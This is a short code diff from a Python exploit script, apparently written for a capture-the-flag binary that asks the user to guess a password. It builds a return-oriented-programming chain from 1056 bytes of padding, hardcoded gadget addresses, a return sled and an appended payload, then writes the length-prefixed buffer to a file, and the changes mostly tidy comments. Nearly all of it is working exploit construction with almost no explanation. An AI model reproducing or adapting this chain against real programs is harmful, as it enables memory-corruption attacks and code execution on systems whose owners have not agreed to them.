@@ -75,22 +75,17 @@ class Harry(p.Manipulator):
 
         c.read(len('If you guess the password, I will give you a reward!\n'))
 
-        #target = self.pack(0x4023da)
-
-        rop = 'A' * 1056 # padding
+        # padding
+        rop = 'A' * 1056
 
         # this is needed for the exception stack unwrapping to not crash
         rop += self.pack(0x400f00)
 
         # that weird address padding is needed to keep rbx pointing to
-        #something reasonable so that gdb doesn't crash
-        #rop += self.pack(0x400f00) * 2 + 'C' * 8
         rop += 'B'*24
         rop += self.G_RET()*28 + self.G_POP_RET('\x00'*8) # this jumps over the null env
         rop += payload
-
-        rop = rop.build()
-        exploit = struct.pack('<I', len(rop) + 10) + rop
+        exploit = struct.pack('<I', len(rop) + 10) + rop.build()
 
         open("sent_exploit", "wb").write(exploit)
 
